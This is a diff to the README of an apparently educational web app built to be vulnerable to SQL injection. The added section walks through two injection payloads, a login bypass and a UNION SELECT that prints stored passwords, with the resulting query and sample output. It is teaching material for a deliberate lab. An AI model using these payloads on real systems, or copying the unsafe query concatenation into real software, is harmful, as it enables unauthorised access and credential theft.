@@ -61,3 +61,49 @@ INTENTIONALLY VULNERABLE TO SQL INJECTION
 ```
 
 The vulnerable routes construct SQL statements by directly concatenating user-controlled strings. The friend-related routes use parameterized queries so the project has a simple contrast between unsafe and safer SQL handling.
+
+## SQL Injection Examples
+
+This project is intentionally vulnerable to SQL injection for educational purposes.
+
+### 1. Login bypass
+
+Enter the following in the username field:
+
+```text
+' OR '1'='1' --
+```
+
+The password field can contain any value.
+
+This modifies the login query so that the condition becomes true and the password check is commented out, allowing authentication without knowing a valid password.
+
+Example vulnerable query:
+
+```sql
+SELECT * FROM users
+WHERE username = '' OR '1'='1' -- '
+AND password = 'anything'
+```
+
+### 2. Display passwords through user search
+
+Enter the following in the user search field:
+
+```text
+' UNION SELECT id, password FROM users --
+```
+
+This uses `UNION SELECT` to append the `password` column from the `users` table to the normal search results.
+
+Because the search page displays the second selected column as if it were a username, the stored passwords are shown in the results.
+
+Example output:
+
+```text
+alice123
+bob123
+charlie123
+```
+
+This demonstrates how SQL injection can expose sensitive database information when user input is inserted directly into SQL queries.
